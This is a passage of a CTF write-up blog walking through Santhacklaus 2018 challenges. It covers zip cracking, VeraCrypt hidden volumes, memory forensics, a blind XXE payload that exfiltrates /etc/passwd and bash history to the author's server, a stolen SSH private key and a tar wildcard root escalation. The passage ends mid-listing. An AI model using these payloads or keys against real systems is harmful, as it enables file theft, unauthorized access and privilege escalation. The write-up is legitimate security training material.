+<p>The <strong>CONFIDENTIEL.zip</strong> contains garbage, nothing usefull. But the <strong>recup.zip</strong> is encrypted!</p>
+
+<h2 id="bruteforce-time">Bruteforce time</h2>
+
+<p>I got an encrypted zip file, I got a wordlist, let&rsquo;s call fcrackzip:</p>
+
+<pre><code class="language-bash">$ fcrackzip -v -D -u -p /home/maki/Tools/wordlist/rockyou.txt 21f64da1e5792c8295b964d159a14491_recup.zip
+found file 'password.txt', (size cp/uc    271/   377, flags 9, chk 5aec)
+
+
+PASSWORD FOUND!!!!: pw == hackerman
+
+$ unzip 21f64da1e5792c8295b964d159a14491_recup.zip
+Archive:  21f64da1e5792c8295b964d159a14491_recup.zip
+[21f64da1e5792c8295b964d159a14491_recup.zip] password.txt password: hackerman
+  inflating: password.txt
+
+$ cat password.txt
+=== FLAG ===
+
+IMTLD{F1nd_Y0uR_W4y}
+
+==== Facebook ===
+
+P@ssw0rd123
+
+=== Twitter ===
+
+azertY#!?$
+
+=== Job ===
+
+Door: 5846
+Computer: 0112#aqzsed
+
+=== zip ===
+
+ohm0-9Quirk
+Finny5-polo2-Rule
+
+=== VC ===
+
+7Rex-Mazda0-hover1-Quid
+Gourd-crown2-gao4-warp2 - Take On Me
+0twain-Mao0-flash-6Goof-Gent
+
+=== Portable ===
+
+Windobe123
+
+=== iPhone ===
+
+123789
+</code></pre>
+
+<h2 id="flag-35">Flag</h2>
+
+<blockquote>
+<p>IMTLD{F1nd_Y0uR_W4y}</p>
+</blockquote>
+
+<h1 id="archdrive-3-3">ArchDrive <sup>3</sup>&frasl;<sub>3</sub></h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>ArchDrive&nbsp;<sup>3</sup>&frasl;<sub>3</sub></td>
+<td>Forensic/Crypto/WTF</td>
+<td>200</td>
+<td>12</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-36">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_archdrive3.png" alt="" />
+<em>Fig 1</em>: &ldquo;ArchDrive <sup>3</sup>&frasl;<sub>3</sub>&rdquo; statement
+</center></p>
+
+<h2 id="state-of-the-art-23">State of the art</h2>
+
+<p>According to the previous part, here is what we got:</p>
+
+<ul>
+<li>There is something to do with Veracrypt</li>
+<li>Veracrypt container hasn&rsquo;t got magic number (documents and media could be containers)</li>
+<li>password.txt contains <strong>VC password</strong> (VC -&gt; Veracrypt)</li>
+</ul>
+
+<h2 id="decrypting-and-mounting">Decrypting and mounting</h2>
+
+<p>There are 3 keys:</p>
+
+<ul>
+<li>7Rex-Mazda0-hover1-Quid</li>
+<li>Gourd-crown2-gao4-warp2 - Take On Me</li>
+<li>0twain-Mao0-flash-6Goof-Gent</li>
+</ul>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/archdrive3_1.png" alt="" />
+<em>Fig 2</em>: Documents and Media mounted
+</center></p>
+
+<ul>
+<li>documents -&gt; 0twain-Mao0-flash-6Goof-Gent</li>
+<li>media -&gt; 7Rex-Mazda0-hover1-Quid</li>
+</ul>
+
+<p>A little tip about forensic, when you&rsquo;re mounting something: Make a copy of your volume, and work and that copy, it will prevent all unannounced change.</p>
+
+<pre><code class="language-bash">$ lsblk
+NAME             MAJ:MIN RM   SIZE RO TYPE  MOUNTPOINT
+loop0              7:0    0    10M  0 loop  
+└─veracrypt1     254:4    0   9,8M  0 dm    /mnt/veracrypt1
+loop1              7:1    0    30M  0 loop  
+└─veracrypt2     254:5    0  29,8M  0 dm    /mnt/veracrypt2
+
+$ sudo dd if=/dev/mapper/veracrypt1 of=clear_document.dmp bs=4M
+$ sudo dd if=/dev/mapper/veracrypt2 of=clear_media.dmp bs=4M
+</code></pre>
+
+<p>After copying, I&rsquo;m using <code>testdisk</code> to browse into.</p>
+
+<pre><code class="language-bash">$ sudo testdisk /path/to/document.dmp 
+Proceed -&gt; None -&gt; Advanced -&gt; Undelete
+</code></pre>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/archdrive3_2.png" alt="" />
+<em>Fig 3</em>: Documents in documents container
+</center></p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/archdrive3_3.png" alt="" />
+<em>Fig 4</em>: Documents in media container
+</center></p>
+
+<p>Using <code>testdisk</code> allows me to find erased files. The MP3 in <code>documents</code> containers is not really helpful.</p>
+
+<h2 id="hidden-volume">Hidden volume</h2>
+
+<p>I remind me something, when I tried to learn how veracrypt work: hidden volume.</p>
+
+<blockquote>
+<p><a href="https://www.veracrypt.fr/en/Hidden%20Volume.html">https://www.veracrypt.fr/en/Hidden%20Volume.html</a></p>
+</blockquote>
+
+<p>There is one more key in the <code>password.txt</code> file:</p>
+
+<blockquote>
+<p>Gourd-crown2-gao4-warp2 - Take On Me</p>
+</blockquote>
+
+<p>And in the <code>media</code> container, there is a MP3 file called:</p>
+
+<blockquote>
+<p>-rwxr-xr-x     0     0   7080168 19-Dec-2018 10:28 a.ha_-_TakeOnMe.mp3</p>
+</blockquote>
+
+<p>Let&rsquo;s try to decrypt the <code>media</code> container with the given key and the MP3 as keyfiles:</p>
+
+<pre><code class="language-bash">$ cp clear_media.dmp hidden_media.dmp 
+</code></pre>
+
+<p><center>
+<img src="https://media.giphy.com/media/l3q2GZaeJ4v24D7P2/giphy.gif" alt="" />
+</center></p>
+
+<p>WTF, it worked! You&rsquo;re really crazy guys, first time seeing this in a CTF! :D</p>
+
+<pre><code class="language-bash">$ sudo dd if=/dev/mapper/veracrypt3 of=clear_media_hidden.dmp bs=4M
+
+$ sudo testdisk clear_media_hidden.dmp 
+</code></pre>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/archdrive3_4.png" alt="" />
+<em>Fig 5</em>: Documents in the hidden container
+</center></p>
+
+<h2 id="flag-36">Flag</h2>
+
+<p>In <code>FLAG.TXT</code>:</p>
+
+<blockquote>
+<p>IMTLD{I_h4v3_N0th1ng_T0_h1d3}</p>
+</blockquote>
+
+<h1 id="archdrive-4-3">ArchDrive <sup>4</sup>&frasl;<sub>3</sub></h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>ArchDrive&nbsp;<sup>4</sup>&frasl;<sub>3</sub></td>
+<td>Web</td>
+<td>700</td>
+<td>8</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-37">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_archdrive4.png" alt="" />
+<em>Fig 1</em>: &ldquo;ArchDrive <sup>4</sup>&frasl;<sub>3</sub>&rdquo; statement
+</center></p>
+
+<h2 id="state-of-the-art-24">State of the art</h2>
+
+<p>After recovering the erased zip archive in the hidden container, we obtain two files:</p>
+
+<ul>
+<li>README.md</li>
+<li>ticket.xml</li>
+</ul>
+
+<pre><code class="language-bash">$ unzip Dark_Lottery_ticket_d2e383e8600daf6dc31c2436aefd3f58.zip 
+Archive:  Dark_Lottery_ticket_d2e383e8600daf6dc31c2436aefd3f58.zip
+  inflating: ticket.xml              
+  inflating: README.md
+
+$ cat README.md
+### This ticket is the property of `Dark Lottery` ###
+If you are not the buyer and if you found / stole this ticket, you must delete it immediately.
+This ticket is unique, do not share it.
+Remember to use it at your own risk.
+
+Thank you for your purchase !
+
+--- scgz54b2lftqkkvn.onion ---
+
+$ cat ticket.xml                      
+&lt;ticket&gt;
+    &lt;number&gt;14453&lt;/number&gt;
+    &lt;status&gt;valid&lt;/status&gt;
+    &lt;date&gt;20/12/2018&lt;/date&gt;
+    &lt;type&gt;premium&lt;/date&gt;
+&lt;/ticket&gt;
+</code></pre>
+
+<h2 id="tor-browsing-buying-drugs">Tor browsing (BUYING DRUGS)</h2>
+
+<p>What happens on this onion website:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/archdrive4_1.png" alt="" />
+<em>Fig 2</em>: Onion website
+</center></p>
+
+<p>It&rsquo;s impossible to buy ticket, it&rsquo;s SOLD OUT :&lsquo;(
+But if you got one, you can play:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/archdrive4_2.png" alt="" />
+<em>Fig 3</em>: Wrong ticket
+</center></p>
+
+<p>Ooooook, our ticket doesn&rsquo;t work. Here is what we got:</p>
+
+<ul>
+<li>XML file</li>
+<li>Upload form</li>
+<li>Same output</li>
+</ul>
+
+<p>It looks to be a blind XXE, or XXE OOB (Out of band): <a href="https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/">https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/</a></p>
+
+<h2 id="xxe-oob">XXE OOB</h2>
+
+<p>I will not use <code>ngrok</code> trick, because I got my VPS now. Before starting, <strong>ironforge</strong> is my VPS and <strong>miniverse</strong> is my laptop.</p>
+
+<p>I craft a new ticket:</p>
+
+<pre><code class="language-bash">miniverse $ cat ticket.xml 
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;
+&lt;!DOCTYPE number [ &lt;!ENTITY % pe SYSTEM &quot;http://51.75.29.170:12345/bite.dtd&quot;&gt; %pe; %param1; ]&gt;
+&lt;ticket&gt;
+    &lt;number&gt;&amp;external;&lt;/number&gt;
+    &lt;status&gt;valid&lt;/status&gt;
+    &lt;date&gt;20/12/2018&lt;/date&gt;
+    &lt;type&gt;premium&lt;/date&gt;
+&lt;/ticket&gt;
+</code></pre>
+
+<p>The IP address is my VPS (where <a href="https://ctf.maki.bzh">https://ctf.maki.bzh</a> is hosted). This XML code, will grab the dtd file on my VPS, then:</p>
+
+<pre><code class="language-bash">ironforge $ cat bite.dtd
+&lt;!ENTITY % stuff SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;
+&lt;!ENTITY % param1 &quot;&lt;!ENTITY external SYSTEM 'http://51.75.29.170:12346/a.php?data=%stuff;'&gt;&quot;&gt;
+</code></pre>
+
+<p>The first XML will grab <code>bite.dtd</code> file, which send the content of <code>/etc/passwd</code> (base64 encoded) on the port <strong>12346</strong> of my VPS:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/archdrive4_3.gif" alt="" />
+<em>Fig 4</em>: XXE OOB in a GIF
+</center></p>
+
+<p>It works!</p>
+
+<h2 id="file-extraction-1">File extraction</h2>
+
+<p>In the <code>/etc/passwd</code> file, only one user got <code>/bin/bash</code> shell: <strong>root</strong>, what does it contain?</p>
+
+<pre><code class="language-bash">ironforge $ cat bite.dtd
+&lt;!ENTITY % stuff SYSTEM &quot;php://filter/convert.base64-encode/resource=/root/.bash_history&quot;&gt;
+&lt;!ENTITY % param1 &quot;&lt;!ENTITY external SYSTEM 'http://51.75.29.170:12346/a.php?data=%stuff;'&gt;&quot;&gt;
+
+ironforge $ nc -lvp 12346
+Listening on [0.0.0.0] (family 0, port 12346)
+Connection from 113.ip-51-75-202.eu 49966 received!
+GET /a.php?data=bHMgLWxhIC9ob21lL2RhcmtfbG90dGVyeS8uc3NoL2lkX3JzYSAKY2F0IC9ob21lL2RhcmtfbG90dGVyeS8uc3NoL2lkX3JzYSAK HTTP/1.0
+Host: 51.75.29.170:12346
+Connection: close
+
+ironforge $ echo -n 'bHMgLWxhIC9ob21lL2RhcmtfbG90dGVyeS8uc3NoL2lkX3JzYSAKY2F0IC9ob21lL2RhcmtfbG90dGVyeS8uc3NoL2lkX3JzYSAK' | base64 -d
+ls -la /home/dark_lottery/.ssh/id_rsa 
+cat /home/dark_lottery/.ssh/id_rsa
+</code></pre>
+
+<h2 id="ssh-connection">SSH connection</h2>
+
+<p>Ok, ssh keys, it start to smells good :D
+Following the same process, I extract:</p>
+
+<ul>
+<li>/home/dark_lottery/.ssh/id_rsa</li>
+<li>/etc/ssh/sshd_config</li>
+</ul>
+
+<blockquote>
+<p>/home/dark_lottery/.ssh/id_rsa</p>
+</blockquote>
+
+<pre><code class="language-raw">-----BEGIN RSA PRIVATE KEY-----
+MIICXQIBAAKBgQC3e6s3ZeRV/lgTltFgmVLB/LBYtzRBSpQUEt/1g/MsMidRhdBw
+W0kDlgchsVHL6kGt26JtHVr04MdFSeCUHiSJVuuqDiEPae+98l4LOWWg2dXwKsIv
+x6qDobCyGNi7HzmkxNTh+NxLq+aIsjk/gw38HtNkZAqwokySDcZhgwHFawIDAQAB
+AoGAQqB/vfAcCDYB2assgL1sVdDiYHS2Xvcr6lYoSUkO5n+X03yaAhLD4q96C3wO
+TdPU4cMdqi28t6tf8QMwr9h6P1+M7CDTsyBQbR7bvm88yzGNBuE9P3oBiKu24+x0
+lPL1TORpHxGOersUz3eH2+hdnGs3xDYNSk8RoUY6ckCv3AECQQDbdwhuvDo+cnkN
+xupfdvSRTfXH05fosfvim6/yvw0ZeyxyAzXE5/KclpNCXzW70JrVI4huXjk5TD7l
+R019nJprAkEA1gcw48pAjFSc6oTexR1ayHQYGFGSx7PvXi+VJHAyFTXP4+l+pk72
+qFlrT4tYMiZqbCws9qAthpsTBnauspBBAQJBAMWOwn2EXV3niEc5n7NuDrxalHxc
+YivrRFZ6VYnMJ8ufUKQVdaqaLZB+D3O451L5dteU0/SeRx7oHtogNIZ1mZ8CQAYp
+mNfGOAuSWB5MixmD2dxRs2vn1WEYpjjBB/tPm7GOphi63WGufl2kjXlx2q0+++t3
+bif/vq/UgTy7aBZOHwECQQC4jty8EX0KdvylXIRzhCK7XvHze+GXHFptaB1wf+Wr
+LAKwqo3/gOiPe8w5CRUWuDfuy04a81OBEF3Gv2pyVctg
+-----END RSA PRIVATE KEY-----
+</code></pre>
+
+<blockquote>
+<p>/etc/ssh/sshd_config</p>
+</blockquote>
+
+<pre><code class="language-raw">### SSH configuration file ###
+
+# General
+Port 2020
+Protocol 2
+AcceptEnv LANG LC_*
+[...]
+</code></pre>
+
+<p>We got a port and a private key :D</p>
+
+<pre><code class="language-bash">miniverse $ chmod 600 dark_lottery_priv.key
+miniverse $ ssh -i dark_lottery_priv.key dark_lottery@51.75.202.113 -p 2020
+
+
+    ___           _        __       _   _
+   /   \__ _ _ __| | __   / /  ___ | |_| |_ ___ _ __ _   _
+  / /\ / _` | '__| |/ /  / /  / _ \| __| __/ _ \ '__| | | |
+ / /_// (_| | |  |   &lt;  / /__| (_) | |_| ||  __/ |  | |_| |
+/___,' \__,_|_|  |_|\_\ \____/\___/ \__|\__\___|_|   \__, |
+                                                      |___/
+Last login: Fri Dec 21 18:28:07 2018 from 77.206.71.218
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+dark_lottery@9db68003fdde:~$ ls
+flag.txt
+</code></pre>
+
+<h2 id="flag-37">Flag</h2>
+
+<blockquote>
+<p>IMTLD{Wh4t_4_H4rD_ch4lL3nge}</p>
+</blockquote>
+
+<h1 id="archdrive-5-3">ArchDrive <sup>5</sup>&frasl;<sub>3</sub></h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>ArchDrive&nbsp;<sup>5</sup>&frasl;<sub>3</sub></td>
+<td>App-script</td>
+<td>300</td>
+<td>8</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-38">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_archdrive5.png" alt="" />
+<em>Fig 1</em>: &ldquo;ArchDrive <sup>5</sup>&frasl;<sub>3</sub>&rdquo; statement
+</center></p>
+
+<h2 id="state-of-the-art-25">State of the art</h2>
+
+<p>Let&rsquo;s privesc. As I said in NetRunner <sup>3</sup>&frasl;<sub>3</sub>, there are few ways to privesc:</p>
+
+<ul>
+<li>sudo misconfigured</li>
+<li>crontab or services running as privileged user</li>
+<li>suid binary or script to exploit</li>
+</ul>
+
+<pre><code class="language-bash">$ sudo -l
+-bash: sudo: command not found
+
+$ ps aux| grep root
+root         1  0.0  0.0  19708  3200 ?        Ss   Dec21   0:00 /bin/bash ./start.sh
+root         8  0.0  0.0  69952  5756 ?        S    Dec21   0:00 /usr/sbin/sshd -D
+root         9  0.0  0.0  29740  2808 ?        S    Dec21   0:00 cron -f
+root        97  0.0  0.0  19952  3656 pts/2    Ss+  Dec21   0:00 bash
+root     13454  0.0  0.0  69952  6504 ?        Ss   12:20   0:00 sshd: dark_lottery [priv]
+dark_lo+ 13539  0.0  0.0  11112   988 pts/0    S+   12:26   0:00 grep root
+</code></pre>
+
+<p>Crontab as root, nice, let&rsquo;s find the cron script:</p>
+
+<pre><code class="language-bash">$ ls -la /
+total 84
+drwxr-xr-x   1 root root 4096 Dec 21 18:26 .
+drwxr-xr-x   1 root root 4096 Dec 21 18:26 ..
+-rwxr-xr-x   1 root root    0 Dec 21 18:26 .dockerenv
+-rwxrwxr--   1 root root  147 Dec 20 18:24 backup.sh
+dr--r-----   1 root root 4096 Dec 22 12:27 backups
+drwxr-xr-x   1 root root 4096 Dec 20 18:26 bin
+drwxr-xr-x   2 root root 4096 Oct 20 10:40 boot
+[...]
+</code></pre>
+
+<p>The <code>backup.sh</code> file is not a regular linux file :p</p>
+
+<pre><code class="language-bash">$ cat /backup.sh
+#!/bin/sh
+
+/bin/rm -rf /backups/*
+cd /opt/src/ &amp;&amp; /bin/tar -cvzf /backups/bck-src_`/bin/date +&quot;%Y-%m-%d_%H%M&quot;`.tar.gz *
+/bin/chmod 440 -R /backups
+</code></pre>
+
+<p>Ok, the exploit is tar wildcard: <a href="https://thanat0s.trollprod.org/2014/07/et-hop-ca-root/">https://thanat0s.trollprod.org/2014/07/et-hop-ca-root/</a></p>
+
+<h2 id="exploit-1">Exploit</h2>
+
+<p>First, where is the flag:</p>
+
+<pre><code class="language-bash">$ ls -la /opt/src 
+total 12
+drwxrwxrwx 1 root root 4096 Dec 21 19:03 .
+drwxr-xr-x 1 root root 4096 Dec 20 18:27 ..
+-r--r----- 1 root root   26 Dec 20 18:24 .flag.txt
+</code></pre>
+
+<p>Second, exploit time :D</p>
+
+<pre><code class="language-bash">$ touch -- '--checkpoint-action=exec=sh install_suidbackdoor.sh' '--checkpoint=1'
+$ echo 'cp /opt/src/.flag.txt /tmp/flag_maki' &gt; install_suidbackdoor.sh
+$ echo 'chmod 777 /tmp/flag_maki' &gt;&gt; install_suidbackdoor.sh
+</code></pre>
+
+<p>After a minute:</p>
+
+<pre><code class="language-bash">$ ls -la /tmp/flag_maki
+-rwxrwxrwx 1 root root 26 Dec 22 12:32 /tmp/flag_maki
+</code></pre>
+
+<h2 id="flag-38">Flag</h2>
+
+<blockquote>
+<p>IMTLD{R04d_T0_Th3_sW1tCH}</p>
+</blockquote>
+
+<h1 id="mission-impossible-1">Mission impossible 1</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>Mission&nbsp;impossible&nbsp;1</td>
+<td>Forensic/Crypto</td>
+<td>800</td>
+<td>18</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-39">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_mi1.png" alt="" />
+<em>Fig 1</em>: &ldquo;Mission impossible 1&rdquo; statement</p>
+
+<p><iframe width="560" height="315" src="https://www.youtube.com/embed/pEfI3ZrLDBs" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+</center></p>
+
+<p>(Awesome work for the video, really appreciate it as a player)</p>
+
+<h2 id="state-of-the-art-26">State of the art</h2>
+
+<p>A memory dump again :D</p>
+
+<p><center>
+<img src="https://media.giphy.com/media/yoJC2GnSClbPOkV0eA/giphy.gif" alt="" />
+</center></p>
+
+<pre><code class="language-bash">$ volatility -f challenge.elf imageinfo
+[...]
+Take a looooooooong time 
+[...]
+
+$ strings challenge.elf | grep 'Linux version' | sort | uniq
+2018-12-16T11:14:09.150996-05:00 virtual-debian kernel: [    0.000000] Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.57-2 (2018-07-14)
+Dec 16 11:14:09 virtual-debian kernel: [    0.000000] Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.57-2 (2018-07-14)
+Dec 16 11:14:09 virtual-debian kernel: [10295.865806] intel_idle: does noual-debian kernel: [    0.000000] Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.57-2 (2018-07-14)
+Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.57-2 (2018-07-14)
+Linux version %d.%d.%d
+MESSAGE=Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.57-2 (2018-07-14)
+</code></pre>
+
+<p>Ok, it&rsquo;s a linux memory dump&hellip;</p>
+
+<p><center>
+<img src="https://media.giphy.com/media/PGxmniUblqoqQ/giphy.gif" alt="" />
+</center></p>
+
+<h2 id="profile-generation">Profile generation</h2>
+
+<p>To do a linux profile for volatility, we need:</p>
+
+<ul>
+<li>Linux distribution</li>
+<li>Version of the distribution</li>
+<li>Version of the kernel</li>
+</ul>
+
+<p>By greping on <strong>Linux version</strong> we got those informations:</p>
+
+<ul>
+<li>Debian</li>
+<li>Debian 8 (the deb8u1)</li>
+<li>3.16.0-6-amd64 kernel</li>
+</ul>
+
+<p>I choose to download the latest release of Debian 8: <a href="https://cdimage.debian.org/cdimage/archive/8.11.0/amd64/iso-cd/debian-8.11.0-amd64-netinst.iso">https://cdimage.debian.org/cdimage/archive/8.11.0/amd64/iso-cd/debian-8.11.0-amd64-netinst.iso</a></p>
+
+<p>Pro tip: Download the netinstall version of Linux, during installation, don&rsquo;t select any additional package except SSH.</p>
+
+<p>When the Debian 8 VM is up, just ssh it and check the installed kernel:</p>
+
+<pre><code class="language-bash">$ ssh user@192.168.122.197
+
+debianVM $ uname -a
+Linux debian 3.16.0-6-amd64 #1 SMP Debian 3.16.57-2 (2018-07-14) x86_64 GNU/Linux
+</code></pre>
+
+<p>It looks to be the right kernel, good. No need to install a new one. Now, install package for linux profile generation and generate it:</p>
+
+<pre><code class="language-bash">debianVM $ sudo apt-get install -y build-essential volatility-tools dwarfdump linux-headers-3.16.0-6-amd64
+
+debianVM $ cd /usr/src/volatility-tools/linux/
+debianVM $ su root
+debianVM # make
+debianVM # zip MI1_profile.zip /usr/src/volatility-tools/linux/module.dwarf /boot/System.map-3.16.0-6-amd64
+updating: usr/src/volatility-tools/linux/module.dwarf (deflated 91%)
+updating: boot/System.map-3.16.0-6-amd64 (deflated 79%)
+</code></pre>
+
+<p>Our profile is created, we have to put in the right place for volatility:</p>
+
+<pre><code class="language-bash">$ sudo updatedb # I know it's deprectated :')
+$ locate volatility | grep overlays | grep linux
+/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux
+/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux/__init__.py
+/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux/__init__.pyc
+/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux/elf.py
+/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux/elf.pyc
+/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux/linux.py
+/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux/linux.pyc
+</code></pre>
+
+<p>Place the <code>MI1_profile.zip</code> archive in <code>/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux</code> folder.</p>
+
+<pre><code class="language-bash">$ volatility --info | grep MI1
+LinuxMI1_profilex64   - A Profile for Linux MI1_profile x64
+</code></pre>
+
+<p>Let&rsquo;s try if it work, to do this, just use a linux volatility plugin, such as <code>linux_banner</code>:</p>
+
+<pre><code class="language-bash">$ volatility -f challenge.elf --profile=LinuxMI1_profilex64 linux_banner
+Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.57-2 (2018-07-14)
+</code></pre>
+
+<p>It works!</p>
+
+<p><center>
+<img src="https://media.giphy.com/media/4PT6v3PQKG6Yg/giphy.gif" alt="" />
+</center></p>
+
+<p>MI1_profile.zip: <a href="https://mega.nz/#!mSRCCQ6L!HRz6qJ02pwlg89Gcc1OQ-iIgBzaAWW6EKIThFXLg3Mc">https://mega.nz/#!mSRCCQ6L!HRz6qJ02pwlg89Gcc1OQ-iIgBzaAWW6EKIThFXLg3Mc</a></p>
+
+<h2 id="raiders-of-the-lost-zip">Raiders of the Lost Zip</h2>
+
+<p>What did the user on the system?</p>
+
+<pre><code class="language-bash">$ volatility -f challenge.elf --profile=LinuxMI1_profilex64 linux_bash
+Pid      Name                 Command Time                   Command
+-------- -------------------- ------------------------------ -------
+    1867 bash                 2018-12-16 16:17:45 UTC+0000   rm flag.txt 
+    1867 bash                 2018-12-16 16:17:45 UTC+0000   ls
+    1867 bash                 2018-12-16 16:17:45 UTC+0000   ls
+    1867 bash                 2018-12-16 16:17:45 UTC+0000   sudo reboot
+    1867 bash                 2018-12-16 16:17:45 UTC+0000   zip -r -e -s 64K backup.zip *
+    1867 bash                 2018-12-16 16:17:45 UTC+0000   cat /dev/urandom &gt; flag.txt 
+    1867 bash                 2018-12-16 16:17:45 UTC+0000   cd /var/www/a-strong-hero.com/
+    1867 bash                 2018-12-16 16:17:45 UTC+0000   sudo reboot
+    1867 bash                 2018-12-16 16:17:49 UTC+0000   cd /var/www/a-strong-hero.com/
+    1867 bash                 2018-12-16 16:17:49 UTC+0000   ls
+    1867 bash                 2018-12-16 16:18:09 UTC+0000   find . -type f -print0 | xargs -0 md5sum &gt; md5sums.txt
+    1867 bash                 2018-12-16 16:18:10 UTC+0000   cat md5sums.txt
+</code></pre>
+
+<p>Hmmm&hellip; What an ugly zip command. After reading the zip manual, actually this command will encrypt recursively and split the original archive into 64Ko pieces. In order to find all parts, let&rsquo;s list all file opened in memory:</p>
+
+<pre><code class="language-bash">$ volatility -f challenge.elf --profile=LinuxMI1_profilex64 linux_find_file -L &gt; filelist 
+
+$ cat filelist | grep backup
+          261933 0xffff88001e61e4b0 /var/www/a-strong-hero.com/backup.z02
+          263120 0xffff88001e61e898 /var/www/a-strong-hero.com/backup.z05
+          263122 0xffff88001e61ec80 /var/www/a-strong-hero.com/backup.z07
+          263123 0xffff88001e61d0c8 /var/www/a-strong-hero.com/backup.z08
+          263125 0xffff88001e61d4b0 /var/www/a-strong-hero.com/backup.zip
+          261792 0xffff88001e61d898 /var/www/a-strong-hero.com/backup.z01
+          262990 0xffff88001e61dc80 /var/www/a-strong-hero.com/backup.z04
+          263121 0xffff88001e61c0c8 /var/www/a-strong-hero.com/backup.z06
+          263124 0xffff88001e61c4b0 /var/www/a-strong-hero.com/backup.z09
+          262949 0xffff88001e61cc80 /var/www/a-strong-hero.com/backup.z03
+</code></pre>
+
+<p>I think I found all pieces! Let&rsquo;s extract them and recreate the original archive:</p>
+
+<pre><code class="language-bash">$ volatility -f challenge.elf --profile=LinuxMI1_profilex64 linux_find_file -i 0xffff88001e61d898 -O backup.z01
+[...]
+Reproduce the operation with correct offset until the z09
+[...]
+
+$ zip -s 0 backup.zip --out unsplit.zip
+
+$ unzip -l unsplit.zip 
+Archive:  unsplit.zip
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+       30  2018-12-16 16:57   flag.txt
+        0  2018-12-16 15:51   jcvd-website/
+        0  2018-12-16 15:51   jcvd-website/js/
+     6148  2018-12-16 15:51   jcvd-website/js/.DS_Store
+    36816  2018-12-16 15:51   jcvd-website/js/bootstrap.min.js
+    95957  2018-12-16 15:51   jcvd-website/js/jquery-1.11.3.min.js
+    68890  2018-12-16 15:51   jcvd-website/js/bootstrap.js
+       79  2018-12-16 15:51   jcvd-website/js/custom.js
+      641  2018-12-16 15:51   jcvd-website/js/ie10-viewport-bug-workaround.js
+     5564  2018-12-16 15:51   jcvd-website/js/jquery.easing.min.js
+    12292  2018-12-16 15:51   jcvd-website/.DS_Store
+        0  2018-12-16 15:51   jcvd-website/images/
+    37682  2018-12-16 15:51   jcvd-website/images/concert.jpg
+     6148  2018-12-16 15:51   jcvd-website/images/.DS_Store
+    52003  2018-12-16 15:51   jcvd-website/images/microphone.jpg
+    49276  2018-12-16 15:51   jcvd-website/images/iphone.jpg
+    91733  2018-12-16 15:51   jcvd-website/images/header.jpg
